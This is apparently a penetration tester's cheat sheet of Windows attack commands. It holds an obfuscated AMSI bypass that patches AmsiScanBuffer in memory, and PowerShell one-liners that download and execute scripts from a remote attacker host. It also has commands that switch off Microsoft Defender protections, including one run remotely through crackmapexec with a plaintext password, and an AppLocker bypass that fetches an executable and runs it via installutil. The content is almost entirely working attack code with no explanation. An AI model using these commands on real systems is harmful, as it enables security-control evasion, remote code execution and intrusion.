AMSI Bypass

```
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsi.txt') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsibypass.txt') | IEX
```

```
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string 
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr 
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = 
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, 
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```







Disable Defender
```
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true 
Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;
sudo crackmapexec smb 172.16.1.201 -u joe -p 'Dev0ftheyear!' -x 'Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;'
```



AppLocker PowerShell Bypass 
```
curl http://192.168.45.201/PSbypassCLM2.exe -o bypass.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
C:\AD\Tools\InviShell\InviShell\RunWithRegistryNonAdmin.bat
```

File Transfers
```
(new-object system.net.webclient).downloadstring('http://192.168.45.201/file.txt') | IEX



